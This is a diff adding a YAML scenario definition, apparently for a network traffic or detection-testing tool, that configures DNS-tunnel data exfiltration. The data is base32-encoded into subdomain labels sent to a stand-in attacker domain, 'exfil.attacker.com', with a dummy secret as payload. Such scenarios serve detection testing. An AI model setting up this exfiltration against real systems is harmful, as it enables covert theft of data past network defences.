@@ -1,0 +1,24 @@
+builder: dns_tunnel
+protocol: udp
+metadata:
+  name: "DNS Tunneling"
+  description: "DNS-based data exfiltration using base32-encoded subdomain labels"
+  category: "covert_channel"
+  difficulty_hint: "hard"
+parameters:
+  dns_server:
+    default: "8.8.8.8"
+    description: "DNS server IP for queries"
+  tunnel_domain:
+    default: "exfil.attacker.com"
+    description: "Attacker-controlled domain for tunneling"
+  secret_message:
+    default: "confidential_project_data_2026"
+    description: "Secret data to exfiltrate via DNS tunnel"
+  chunk_size:
+    default: 50
+    min: 10
+    max: 50
+    description: "Characters per DNS subdomain label (max 50 for DNS safety)"
+steps:
+  - action: dns_exfiltrate
